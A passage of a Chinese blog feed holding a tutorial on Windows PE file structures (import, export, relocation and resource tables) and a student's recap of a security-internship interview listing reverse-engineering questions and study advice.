title="PEview查看PE"><p>此时，导入表的地址已经找到了，接下来找<code>MessageBox()</code>的地址。</p><p>从上图可知，该PE文件导入了4个DLL，每个对应一个IID，最后以一个空的IID结尾。已知<code>MessageBox()</code>函数在<code>USER32.DLL</code>中，所以应该在第一个IID里找。可以根据<code>OriginalFirstThunk</code>找，也可以根据<code>FirstThunk</code>找。无论哪个，它们都指向相同的数据类型<code>IMAGE_THUNK_DATA32</code>。</p><p>我们先根据<code>OriginalFirstThunk</code>找。<code>OriginalFirstThunk</code>的值为0x1B2E0，即表示INT的<code>IMAGE_THUNK_DATA32</code>结构数组首地址。该RVA也在idata块中，所以<code>IMAGE_THUNK_DATA32</code>数组在PE文件偏移为0x82E0的地方。</p><img src="/posts/4dec66bb/5.3.12.png" class="" title="PEview查看PE"><p>可以看到有3个<code>IMAGE_THUNK_DATA32</code>型变量，最后一个为空表示结尾。<code>IMAGE_THUNK_DATA32</code>只占4个字节，当双字字节的最高位为0时，表示函数以字符串类型的函数名方式输入，这时双字的值是一个RVA，指向一个<code>IMAGE_IMPORT_BY_NAME</code>结构。我们找的是<code>MessageBox()</code>函数的地址，所以应找RVA为0x1B43E相对于PE文件的偏移。该RVA也在idata中，所以表示<code>MessageBox()</code>函数的<code>IMAGE_IMPORT_BY_NAME</code>结构在PE中的偏移为0x843E。</p><img src="/posts/4dec66bb/5.3.13.png" class="" title="PEview查看PE"><p>再根据<code>FirstThunk</code>找。<code>IMAGE_THUNK_DATA32</code>的偏移在0x8098。</p><img src="/posts/4dec66bb/5.3.14.png" class="" title="PEview查看PE"><p>代表<code>MessageBox()</code>函数的<code>IMAGE_IMPORT_BY_NAME</code>结构在0x843E。</p><p>故在静态存放时，IAT和INT都是指向<code>IMAGE_IMPORT_BY_NAME</code>结构。</p><p>那将它加载进内存，会有什么不一样呢？运行EXE程序，使用PE Tools将运行中的EXE程序全部dump下来。</p><img src="/posts/4dec66bb/5.3.15.jpg" class="" title="PEToolsdump"><p><code>Dumped.exe</code>和<code>Project4.exe</code>有什么区别呢？<code>Dumped.exe</code>是<code>Project4.exe</code>通过Windows加载器加载进内存中之后，再按照内存大小1:1映射回磁盘的文件。</p><img src="/posts/4dec66bb/5.3.16.png" class="" title="区别"><p>用PEview查看<code>Dumped.exe</code>，重复上述操作查看IAT和INT的指针。</p><img src="/posts/4dec66bb/5.3.17.png" class="" title="PEview查看映像文件"><img src="/posts/4dec66bb/5.3.18.png" class="" title="PEview查看映像文件"><img src="/posts/4dec66bb/5.3.19.png" class="" title="PEview查看映像文件"><p>可以看出<code>MessageBox()</code>函数在内存中的真正地址为0x761410C0。</p><h2 id="5-4-输出表"><a href="#5-4-输出表" class="headerlink" title="5.4 输出表"></a>5.4 输出表</h2><p>当PE文件被执行的时候，Windows加载器将文件装入内存并将导入表登记的动态链接库(一般是DLL格式)文件一并装入地址空间，再根据DLL文件中的函数导出信息，对可执行文件的IAT进行修正。</p><p>动态链接库是被映射到其它应用程序的地址空间中执行的，它和应用程序可以看成是“一体”的，动态链接库可以使用应用程序的资源，它所拥有的资源也可以被应用程序使用，它的任何操作都是代表应用程序进行的，当动态链接库进行打开文件、分配内存和创建窗口等操作后，这些文件、内存和窗口都是为应用程序所拥有的。</p><p>导出表就是记载着动态链接库的一些导出信息。通过导出表，DLL 文件可以向系统提供导出函数的名称、序号和入口地址等信息，以便Windows 加载器通过这些信息来完成动态连接的整个过程。</p><p>注意：扩展名为<code>.exe</code>的PE文件一般不存在导出表，而大部分的<code>.dll</code>文件中都包含导出表。但注意，这并不是绝对。比如纯粹用作资源的<code>.dll</code>文件不需要导出函数，有些特殊功能的<code>.exe</code>文件也会存在导出函数。</p><h3 id="5-4-1-导出表结构"><a href="#5-4-1-导出表结构" class="headerlink" title="5.4.1 导出表结构"></a>5.4.1 导出表结构</h3><p>PE文件头的<code>IAMGE_OPTIONAL_HEADER</code>结构中的<code>DataDirectory</code>的第一个成员就是指向导出表。导出表是用来描述模块中的导出函数的结构，如果一个模块导出了函数，那么这个函数会被记录在导出表中，这样通过<code>GetProcAddress()</code>函数就能动态获取到函数的地址。函数导出的方式有两种，一种是按名字导出，一种是按序号导出。这两种导出方式在导出表中的描述方式也不相同。</p><p>导出表（Export Table）中的主要成分是一个表格，内含函数名称、输出序数等。序数是指定DLL 中某个函数的16位数字，在所指向的DLL 文件中是独一无二的。在此不提倡仅仅通过序数来索引函数的方法，这样会给DLL 文件的维护带来问题。例如当DLL 文件一旦升级或修改就可能导致调用该DLL 的程序无法加载到需要的函数。</p><h3 id="5-4-2-IMAGE-EXPORT-DIRECTORY"><a href="#5-4-2-IMAGE-EXPORT-DIRECTORY" class="headerlink" title="5.4.2 IMAGE_EXPORT_DIRECTORY"></a>5.4.2 IMAGE_EXPORT_DIRECTORY</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;<span class="comment">//未使用，总是定义为0</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">//文件生成时间</span></span><br><span class="line">    WORD    MajorVersion;<span class="comment">//未使用，总是定义为0</span></span><br><span class="line">    WORD    MinorVersion;<span class="comment">//未使用，总是定义为0</span></span><br><span class="line">    DWORD   Name;<span class="comment">//模块名字</span></span><br><span class="line">    DWORD   Base;<span class="comment">//基数，加上序数就是函数地址数组的索引值</span></span><br><span class="line">    DWORD   NumberOfFunctions;<span class="comment">//所有导出函数的数量</span></span><br><span class="line">    DWORD   NumberOfNames;<span class="comment">//按名字导出函数的数量</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">//指向输出函数地址的RVA</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">//指向输出函数名字的RVA</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">//指向输出函数序号的RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>重要字段说明如下：</p><ul><li><p>Name：一个RVA 值，指向一个定义了模块名称的字符串。如即使<code>Kernel32.dll</code>文件被改名为<code>Ker.dll</code>，仍然可以从这个RVA值得知其在编译时的文件名是<code>Kernel32.dll</code>。</p></li><li><p>NumberOfFunctions：文件中包含的导出函数的总数。</p></li><li><p>NumberOfNames：被定义函数名称的导出函数的总数。显然只有这个数量的函数既可以用函数名方式导出，也可以用序号方式导出。剩下的<code>NumberOfFunctions</code>减去<code>NumberOfNames</code>数量的函数只能用序号方式导出。该字段的值只会小于或者等于<code>NumberOfFunctions</code>字段的值，如果这个值是0，表示所有的函数都是以序号方式导出的。</p></li><li><p>AddressOfFunctions：一个RVA 值，指向包含全部导出函数入口地址的双字数组。数组中的每一项是一个RVA 值，数组的项数等于<code>NumberOfFunctions</code>字段的值。</p></li><li><p>Base：导出函数序号的起始值，将<code>AddressOfFunctions</code>字段指向的入口地址表的索引加上这个起始值就是对应函数的导出序号。</p><p>假如Base 字段的值为x，那么入口地址表指定的第1个导出函数的序号就是x；第2个导出函数的序号就是x＋1。总之，一个导出函数的导出序号等于Base 字段的值加上其在入口地址表中的位置索引值。</p></li><li><p>AddressOfNames 和 AddressOfNameOrdinals：均为RVA 值。前者指向函数名字符串地址表。这个地址表是一个双字数组，数组中的每一项指向一个函数名称字符串的RVA。数组的项数等于<code>NumberOfNames</code>字段的值，所有有名称的导出函数的名称字符串都定义在这个表中；后者指向一个word 类型的数组，数组项目与文件名地址表中的项目一一对应，项目值代表函数入口地址表的索引，这样函数名称与函数入口地址关联起来。</p><p>假如函数名称字符串地址表的第n项指向一个字符串“MyFunction”，那么可以去查找<code>AddressOfNameOrdinals</code>指向的数组的第n项，假如第n项中存放的值是x，则表示<code>AddressOfFunctions</code>字段描述的地址表中的第x项函数入口地址对应的名称就是“MyFunction”。</p></li></ul><img src="/posts/4dec66bb/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%9B%B8%E4%BA%92%E5%85%B3%E7%B3%BB.png" class="" title="导出表相互关系"><h3 id="※5-4-3-查找函数入口地址"><a href="#※5-4-3-查找函数入口地址" class="headerlink" title="※5.4.3 查找函数入口地址"></a>※5.4.3 查找函数入口地址</h3><h4 id="5-4-3-1-从序号查找函数入口地址"><a href="#5-4-3-1-从序号查找函数入口地址" class="headerlink" title="5.4.3.1 从序号查找函数入口地址"></a>5.4.3.1 从序号查找函数入口地址</h4><p>Windows 装载器的工作步骤如下：</p><ol><li>定位到PE 文件头</li><li>从PE 文件头中的<code>IMAGE_OPTIONAL_HEADER32</code>结构中取出数据目录表，并从第一个数据目录中得到导出表的RVA</li><li>从导出表的<code>Base</code>字段得到起始序号</li><li>将需要查找的导出序号减去起始序号，得到函数在入口地址表中的索引</li><li>检测索引值是否大于导出表的<code>NumberOfFunctions</code>字段的值，如果大于后者的话，说明输入的序号是无效的</li><li>用这个索引值在<code>AddressOfFunctions</code>字段指向的导出函数入口地址表中取出相应的项目，这就是函数入口地址的RVA 值，当函数被装入内存的时候，这个RVA 值加上模块实际装入的基地址，就得到了函数真正的入口地址</li></ol><h4 id="5-4-3-2-从函数名称查找入口地址"><a href="#5-4-3-2-从函数名称查找入口地址" class="headerlink" title="5.4.3.2 从函数名称查找入口地址"></a>5.4.3.2 从函数名称查找入口地址</h4><p>Windows 装载器的工作步骤如下：</p><ol><li>最初的步骤是一样的，那就是首先得到导出表的地址</li><li>从导出表的<code>NumberOfNames</code>字段得到已命名函数的总数，并以这个数字作为循环的次数来构造一个循环</li><li>从<code>AddressOfNames</code>字段指向得到的函数名称地址表的第一项开始，在循环中将每一项定义的函数名与要查找的函数名相比较，如果没有任何一个函数名是符合的，表示文件中没有指定名称的函数</li><li>如果某一项定义的函数名与要查找的函数名符合，那么记下这个函数名在字符串地址表中的索引值，然后在<code>AddressOfNamesOrdinals</code>指向的数组中以同样的索引值取出数组项的值，我们这里假设这个值是x</li><li>最后，以 x 值作为索引值，在<code>AddressOfFunctions</code>字段指向的函数入口地址表中获取的 RVA 就是函数的入口地址</li></ol><p>一般情况下病毒程序就是通过函数名称查找入口地址的，因为病毒程序作为一段额外的代码被附加到可执行文件中的，如果病毒代码中用到某些 API 的话，这些 API 的地址不可能在宿主文件的导出表中为病毒代码准备好。因此只能通过在内存中动态查找的方法来实现获取 API 的地址。</p><h3 id="5-4-4-查找函数入口地址例子"><a href="#5-4-4-查找函数入口地址例子" class="headerlink" title="5.4.4 查找函数入口地址例子"></a>5.4.4 查找函数入口地址例子</h3><p>比如我们用<code>user32.dll</code>作为研究对象。DLL程序不能直接双击运行，如果想要单纯把它加载进内存，可以在“运行”(徽标键 + R)中输入<code>rundll32.exe C:\Users\Dell\Desktop\user32.dll</code>。</p><p>当然，我们查找函数入口地址不需要将它加载进内存，只需载入PEview分析。注意，PEview只支持查看在IAT/INT中前32个导入的DLL。</p><p>首先在<code>IMAGE_OPTIONAL_HEADER32</code>中得到导出表的RVA，为0x9D5B0。</p><img src="/posts/4dec66bb/5.4.1.png" class="" title="导出表RVA"><p>遍历区块表，可知导出表在text区块中。RVA2=0x9D5B0-0x1000=0x9C5B0，导出表的FOA=0x400+0x9C5B0=0x9C9B0。</p><img src="/posts/4dec66bb/5.4.2.png" class="" title="导出表RVA"><img src="/posts/4dec66bb/5.4.3.png" class="" title="导出表RVA"><h4 id="5-4-4-1-从序号查找函数入口地址"><a href="#5-4-4-1-从序号查找函数入口地址" class="headerlink" title="5.4.4.1 从序号查找函数入口地址"></a>5.4.4.1 从序号查找函数入口地址</h4><p><a href="https://www.bilibili.com/video/BV1us411P7nL?p=10">找到PE文件中输出表的导出函数地址 空降23:05</a></p><h2 id="5-5-基址重定位"><a href="#5-5-基址重定位" class="headerlink" title="5.5 基址重定位"></a>5.5 基址重定位</h2><p>链接器生成一个PE文件时，它会假设程序被装入时使用的默认<code>ImageBase</code>基地址（VC默认EXE基地址00400000h，DLL基地址10000000h），并且会把代码中所有指令中用到的地址都使用默认的基地址（例如程序代码中 push 10001000，就是把10000000h当做了基地址，把push 10001000写入到文件中）。如果一个EXE程序中一个DLL装载时的地址与其它DLL地址发生冲突（因为Windows程序是虚拟地址空间，EXE一般不会有地址冲突，加载DLL时可能会有地址冲突），就需要修改代码中的地址，这时就需要进行基址重定位。</p><p>凡是涉及到直接寻址的指令都需要进行重定位处理，如push 10001000，call 10002000等。假设重定位后的基地址由原来的10000000h变为20000000h，那么push 10001000应该改成push 20001000。</p><p>所以重定位的算法可以总结为：</p><p>重定位后的地址 = 直接寻址指令中的双字地址 + (模块实际装入地址 - 模块建议装入地址)</p><p>在PE文件中，基址重定位表一般放在一个单独的<code>.reloc</code>区，可以通过<code>IMAGE_OPTIONAL_HEADER</code>中的<code>DataDirectory[5]</code>查看基址重定位表的RVA。PE文件的重定位表中保存的就是文件中所有需要进行重定位修正的代码的地址。基址重定位表是由一个个<code>IMAGE_BASE_RELOCATION</code>结构构成的。</p><h3 id="5-5-1-IMAGE-BASE-RELOCATION"><a href="#5-5-1-IMAGE-BASE-RELOCATION" class="headerlink" title="5.5.1 IMAGE_BASE_RELOCATION"></a>5.5.1 IMAGE_BASE_RELOCATION</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line">    WORD    TypeOffset[];</span><br><span class="line">&#125; IMAGE_BASE_RELOCATION, * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><ul><li>VirtualAddress：重定位数据开始的RVA地址。</li><li>SizeOfBlock：重定位块的长度。</li><li>TypeOffset[]：一个数组，它的元素个数就是$\frac {SizeOfBlock-8}{2}$，每一个元素占用两个字节(16位)，其中高4位表示重定位类型，低12位表示重定位地址。它与<code>VirtualAddress</code>相加即是指向PE映像中需要修改的地址数据的指针。</li></ul><h2 id="5-6-资源表"><a href="#5-6-资源表" class="headerlink" title="5.6 资源表"></a>5.6 资源表</h2><p>Windows程序的各种界面称为资源，包括加速键、位图、光标、对话框、图标、菜单、串表、工具栏和版本信息等。资源是PE文件中非常重要的部分，几乎所有的PE文件中都包含着资源，与导入表和导出表相比，资源的组织方式要复杂得多。</p><img src="/posts/4dec66bb/%E8%B5%84%E6%BA%90%E6%A0%91%E5%BD%A2%E7%BB%93%E6%9E%84.png" class="" title="资源的树形结构"><p>资源有很多种类型，每种类型的资源中可能存在多个资源项，这些资源项用不同的ID或名称来区分，采取类似于磁盘目录结构的方式保存。从上图可以看到，PE文件中的资源是按照 资源类型 -&gt; 资源ID -&gt; 资源代码页 的3层树型目录结构来组织资源的，通过层层索引才能够进入相应的子目录找到正确的资源。</p><h3 id="5-6-1-资源目录结构"><a href="#5-6-1-资源目录结构" class="headerlink" title="5.6.1 资源目录结构"></a>5.6.1 资源目录结构</h3><p>数据目录表中的<code>IMAGE_DIRECTORY_ENTRY_RESOURCE</code>条目(第三项)包含资源的RVA和大小。资源目录结构中的每一个结点都是由<code>IMAGE_RESOURCE_DIRECTORY</code>结构和紧跟其后的数个<code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>结构组成的。</p><img src="/posts/4dec66bb/%E8%B5%84%E6%BA%90%E7%9B%AE%E5%BD%95.png" class="" title="资源目录结构"><h3 id="5-6-2-IMAGE-RESOURCE-DIRECTORY"><a href="#5-6-2-IMAGE-RESOURCE-DIRECTORY" class="headerlink" title="5.6.2 IMAGE_RESOURCE_DIRECTORY"></a>5.6.2 IMAGE_RESOURCE_DIRECTORY</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    WORD    NumberOfNamedEntries;   <span class="comment">// 用字符串作为资源标识的条目个数</span></span><br><span class="line">    WORD    NumberOfIdEntries;      <span class="comment">// 用数字ID作为资源标识的条目个数</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;</span><br></pre></td></tr></table></figure><p>唯一要注意的就是<code>NameberOfNamedEntries</code>和<code>NumberOfIdEntries</code>，它们说明了本目录中目录项的数量，两者加起来就是本目录中的目录项总和，也就是后边跟着的<code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>数目。</p><h3 id="5-6-3-IMAGE-RESOURCE-DIRECTORY-ENTRY"><a href="#5-6-3-IMAGE-RESOURCE-DIRECTORY-ENTRY" class="headerlink" title="5.6.3 IMAGE_RESOURCE_DIRECTORY_ENTRY"></a>5.6.3 IMAGE_RESOURCE_DIRECTORY_ENTRY</h3><p><code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>紧跟在资源目录结构后，此结构长度为 8 个字节，包含 2 个字段。该结构定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD NameOffset:<span class="number">31</span>;<span class="comment">//资源名偏移</span></span><br><span class="line">            DWORD NameIsString:<span class="number">1</span>;<span class="comment">//资源名为字符串</span></span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">        DWORD   Name;<span class="comment">//资源/语言类型</span></span><br><span class="line">        WORD    Id;<span class="comment">//资源数字ID</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;    <span class="comment">// 资源名称</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   OffsetToData;<span class="comment">//数据偏移地址</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD   OffsetToDirectory:<span class="number">31</span>;<span class="comment">//子目录偏移地址</span></span><br><span class="line">            DWORD   DataIsDirectory:<span class="number">1</span>;<span class="comment">//数据为目录</span></span><br><span class="line">        &#125; DUMMYSTRUCTNAME2;</span><br><span class="line">    &#125; DUMMYUNIONNAME2;   <span class="comment">// 资源位置</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY_ENTRY,*PIMAGE_RESOURCE_DIRECTORY_ENTRY;</span><br></pre></td></tr></table></figure><p>这个结构体在每一层中都是以结构体数组的方式存在，但在每一层的含义都不同：</p><ul><li>第一层，每个元素代表一种资源</li><li>第二层，每个元素代表一个资源</li><li>第三层，每个元素代表一个资源的位置</li></ul><h4 id="5-6-3-1-第一个联合体"><a href="#5-6-3-1-第一个联合体" class="headerlink" title="5.6.3.1 第一个联合体"></a>5.6.3.1 第一个联合体</h4><ul><li>如果最高位为0，也就是<code>NameIsString</code>为0，此时4字节代表资源类型，也就是ID起作用</li></ul><div class="table-container"><table><thead><tr><th>值</th><th>资源类型</th><th>值</th><th>资源类型</th></tr></thead><tbody><tr><td>0x01</td><td>鼠标指针</td><td>0x08</td><td>字体</td></tr><tr><td>0x02</td><td>位图</td><td>0x09</td><td>快捷键</td></tr><tr><td>0x03</td><td>图标</td><td>0x0A</td><td>非格式化资源</td></tr><tr><td>0x04</td><td>菜单</td><td>0x0B</td><td>消息列表</td></tr><tr><td>0x05</td><td>对话框</td><td>0x0C</td><td>鼠标指针组</td></tr><tr><td>0x06</td><td>字符串列表</td><td>0x0E</td><td>图标组</td></tr><tr><td>0x07</td><td>字体目录</td><td>0x0F</td><td>版本信息</td></tr></tbody></table></div><ul><li><p>如果最高位为1，也就是<code>NameIsString</code>为1，这是<code>NameOffset</code>指向保存字符串的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIR_STRING_U</span> &#123;</span></span><br><span class="line">    WORD    Length;<span class="comment">//字符串长度</span></span><br><span class="line">    WCHAR   NameString[<span class="number">1</span>];<span class="comment">//UNICODE字符串</span></span><br><span class="line">&#125;IMAGE_RESOURCE_DIR_STRING_U,*PIMAGE_RESOURCE_DIR_STRING_U;</span><br></pre></td></tr></table></figure></li></ul><p>第二个元素<code>NameString</code>为字符串起始地址，长度为<code>Length</code>，这个串不是以0结尾。</p><h4 id="5-6-3-2-第二个联合体"><a href="#5-6-3-2-第二个联合体" class="headerlink" title="5.6.3.2 第二个联合体"></a>5.6.3.2 第二个联合体</h4><ul><li>如果最高位为1，也就是<code>DataIsDirectory</code>为1，代表<code>OffsetToDirectory</code>指向的地方是一个目录。通常，第一层和第二层，这个值都是1。</li><li>如果最高位为0，也就是<code>DataIsDirectory</code>为0，代表<code>OffsetToDirectory</code>指向的地方是一个数据。通常，第三层，这个值为0。</li></ul><h3 id="5-6-4-IMAGE-RESOURCE-DATA-ENTRY"><a href="#5-6-4-IMAGE-RESOURCE-DATA-ENTRY" class="headerlink" title="5.6.4 IMAGE_RESOURCE_DATA_ENTRY"></a>5.6.4 IMAGE_RESOURCE_DATA_ENTRY</h3><p>这个结构体是第三层指向的，最终资源的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DATA_ENTRY</span> &#123;</span></span><br><span class="line">    DWORD   OffsetToData;   <span class="comment">// 资源偏移，RVA</span></span><br><span class="line">    DWORD   Size;           <span class="comment">// 资源大小</span></span><br><span class="line">    DWORD   CodePage;       <span class="comment">// 资源页属性</span></span><br><span class="line">    DWORD   Reserved;</span><br><span class="line">&#125; IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;</span><br></pre></td></tr></table></figure><img src="/posts/4dec66bb/PE%E7%BB%93%E6%9E%84.png" class="" title="PE结构总结">]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows逆向最基础的就是要对PE结构烂熟于心，我之前做了很多题又怎样呢，还是对PE结构一知半解，地基打不好就别梦想盖高楼。知其然知其所以然，千万不要图“快”而忽略一些重要的细节，慢就是快，这也是我这段时间悟出来的道理。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>奇安信暑期实习安全研究员一面凉经</title>
    <link href="http://example.com/posts/61cb3b01.html"/>
    <id>http://example.com/posts/61cb3b01.html</id>
    <published>2022-05-16T00:03:56.760Z</published>
    <updated>2022-06-25T12:36:03.671Z</updated>
    
    <content type="html"><![CDATA[<p>我第一次面试…好尴尬啊一问三不知，技术面试官还能跟我聊50分钟，不，是他问问题问了50分钟，笑死。呜呜呜不过面试官好温柔啊，问了我这么多问题我都不知道，他也没有丝毫不耐烦，dbq我辜负了您的期望，我心里一直在想快结束吧我真的不会！！！而且他还是在加班的时候被我打电话过去说要面试的，那他后面岂不是要加加班，呜呜呜非常抱歉浪费您宝贵的50分钟，我太菜了。还有他给我提供了今后如何学习某个逆向方向的建议，使我整个学习规划都清晰了许多，我真的是非常感谢他~</p><p>废话结束，进入正题。</p><span id="more"></span><p>1.首先自我介绍吧，主要是你在大学里边做了一些什么与安全相关的项目，比较拿得出手的一些项目，其次是你自己的一个技能点，你最擅长做什么事情。</p><p>2.我看你投的是安全研究员软件方向，你期望的工作内容是什么？</p><p>3.你有没有分析过Windows平台下的样本、病毒？</p><p>4.相对虚拟地址(RVA)和文件偏移地址(FOA)间的转换。</p><p><a href="https://bbs.pediy.com/thread-221766.htm">https://bbs.pediy.com/thread-221766.htm</a></p><p>5.代码段具有可读可写可执行中的哪些权限？</p><p>6.IAT(导入地址表)是用来干什么的，导入的具体流程。</p><p>7.在shellcode中动态定位API的过程。</p><p>8.Windows平台病毒样本的类型。</p><p><a href="https://www.docin.com/p-2495525891.html">https://www.docin.com/p-2495525891.html</a></p><p>这个好牛，如果写得不错买它！ <a href="https://blog.csdn.net/eastmount/category_9193519.html">https://blog.csdn.net/eastmount/category_9193519.html</a> </p><p>9.常见的函数调用约定类型有哪些？</p><p><a href="https://baike.baidu.com/item/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/3306047?fr=aladdin">https://baike.baidu.com/item/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/3306047?fr=aladdin</a></p><p>10.函数的返回地址保存在什么位置？</p><p>EBP+4</p><p>11.异常处理机制的具体工作流程。</p><p><a href="https://blog.csdn.net/TCP_321/article/details/121784949">https://blog.csdn.net/TCP_321/article/details/121784949</a></p><p>12.WinDBG要会用。</p><p>13.Windows平台下的hook和注入技术。hook类型有哪些？注入方法有哪些？</p><p>可以跟着这位博主学学 <a href="https://www.cnblogs.com/SunsetR/">https://www.cnblogs.com/SunsetR/</a></p><p>14.您有没有分析过漏洞？(漏洞会比样本更有难度。)</p><p>15.dll劫持了解吗？</p><p>16.有没有去复现过一些漏洞？</p><p><strong>反问环节</strong></p><p>1.安全研究员暑期实习有4个方向，会被分配到想去的那个方向吗？</p><p>答：面试官的组包括漏洞二进制安全、软件安全、网络安全。(如果进了他的组就是做这些了)</p><p>2.在实习期间的主要工作内容？</p><p>答：有三个方向：Web、Windows、Linux。每一个方向都有相应的安全产品的技术研究。比如Windows平台，有360、天勤、火绒，我们的组是基础攻防组，主要去研究这些产品的防护原理，也就是做攻击和防御研究的；其次做漏洞分析，比如这个月微软补丁日出来了，会去研究一下哪些危害比较高的漏洞，写POC或根据已有的POC去把它的漏洞利用(exp)写出来；还有安全技术的研究，比如说exp写出来了，但是只是完成了exp，只是拿到了权限，它并不能做一些真正的恶意操作，这个时候就需要做攻击技术的人去写shellcode，将shellcode加入到exp中，两者结合做一些攻击利用。还有漏洞挖掘的工作，针对Windows平台和Linux平台的浏览器和文档类软件，比如pdf、office软件。</p><p>面：在这次面试中做了哪些准备？</p><p>安全研究岗更偏向于实际的一些东西，动手实践的东西，你能做什么，做了一些什么项目，而不是理论。操作系统、计算机网络更偏向于开发岗。</p><p>我：怎么去学习？</p><p>答：对于Windows平台，最基础的，CTF是一个很好的跳板，更好的练习方法就是实际去做一个样本的分析。Windows平台不管是做漏洞还是做威胁情报还是病毒分析，最核心的一点的就是，他们所有都是PE文件，所以要对PE文件结构非常熟悉，其次是Windows平台下的hook和注入技术，不管是安全软件还是病毒，都会大量使用到。更高阶的，做漏洞分析。比如office的漏洞、浏览器的漏洞、提权的漏洞。通过做病毒分析，可以把上面基础的东西用到，那这些基础知识自然就知道了。hook技术如何检测虚拟机、反调试、脱壳、内存解密、执行。特别是那种APT病毒，挖矿、勒索，分析很多这种，那些知识你都可以掌握得到。所以如果你想从Windows平台去入门，一定要从实战去做，边操作边学习。通过分析大量病毒样本，对于病毒的加解密、遍历文件，同时也要去考虑安全软件如何去防护这些病毒的。当你对Windows平台的基础比较了解的时候，那么你就可以开始做一些更高阶的，比如说漏洞利用的研究，uaf注入类型的漏洞、栈溢出、堆溢出等等。比较流行的勒索，有报告的，可以参考报告去看，一步一步自己手动分析出来。每家安全公司都有威胁安全情报中心，比如奇安信、360、深信服，可以去看他们的报告，自己去做分析。</p><p>奇安信安全岗主要职责：漏洞研究、APT样本研究、攻击利用手法研究、安全产品漏洞研究</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我第一次面试…好尴尬啊一问三不知，技术面试官还能跟我聊50分钟，不，是他问问题问了50分钟，笑死。呜呜呜不过面试官好温柔啊，问了我这么多问题我都不知道，他也没有丝毫不耐烦，dbq我辜负了您的期望，我心里一直在想快结束吧我真的不会！！！而且他还是在加班的时候被我打电话过去说要面试的，那他后面岂不是要加加班，呜呜呜非常抱歉浪费您宝贵的50分钟，我太菜了。还有他给我提供了今后如何学习某个逆向方向的建议，使我整个学习规划都清晰了许多，我真的是非常感谢他~&lt;/p&gt;
&lt;p&gt;废话结束，进入正题。&lt;/p&gt;</summary>
    
